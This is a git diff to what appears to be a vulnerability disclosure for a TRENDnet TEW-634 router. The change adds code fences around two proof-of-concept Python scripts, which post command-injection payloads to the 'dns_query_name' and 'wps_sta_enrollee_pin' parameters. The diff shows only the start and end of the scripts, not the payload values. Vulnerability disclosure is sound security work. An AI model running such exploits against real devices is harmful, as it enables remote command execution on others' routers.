@@ -41,6 +41,7 @@ The second command injection occurred in the "dns_query_name" parameter of http:
 ![image](https://github.com/WhereisRain/TEW-634/blob/main/dns_query_name.png)
 
 # poc2
+```
 import requests
 
 ip = "http://192.168.10.1/"
@@ -65,13 +66,14 @@ r = requests.post(url, data=payload)
 print(r.headers)
 
 print(r.text)
-
+```
 # set_sta_enrollee_pin.cgi
 The third command injection occurred in the "wps_sta_enrollee_pin" parameter of the URL http://ip/set_sta_enrollee_pin.cgi, as shown in the following figure.
 
 ![image](https://github.com/WhereisRain/TEW-634/blob/main/wps_sta_enrollee_pin.png)
 
 # poc3
+```
 import requests
 
 ip = "http://192.168.10.1/"
@@ -94,3 +96,4 @@ r = requests.post(url, data=payload)
 print(r.headers)
 
 print(r.text)
+```
